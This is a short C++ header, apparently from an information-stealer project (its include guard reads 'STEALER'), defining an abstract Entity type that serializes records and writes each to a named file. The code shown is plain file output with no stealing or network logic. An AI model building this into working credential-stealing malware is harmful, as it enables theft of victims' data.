//
// Created by .1qxz on 10.06.2024.
//

#ifndef STEALER_ENTITY_H
#define STEALER_ENTITY_H

#include "../Includes.h"

struct Entity {
    virtual std::string toString() = 0;
    virtual std::string getFileName() = 0;
    virtual bool canBeWrite() = 0;

    void write(std::stringstream &ss, bool newLine = true)
    {
        ss << toString();
        ss << "\n";

        if(newLine)
            ss << "\n";
    }

    static void writeSelf(const fs::path &dst, std::list<std::unique_ptr<Entity>> &entities, bool newLine = true, bool append = true) {
        if(entities.empty())
            return;

        for (const auto& entity : entities)
        {
            if(!entity->canBeWrite())
                continue;

            std::stringstream ss;
            entity->write(ss, newLine);
            Utils::writeFile(dst / entity->getFileName(), ss.str(), append);
        }
    }
};

#endif //STEALER_ENTITY_H
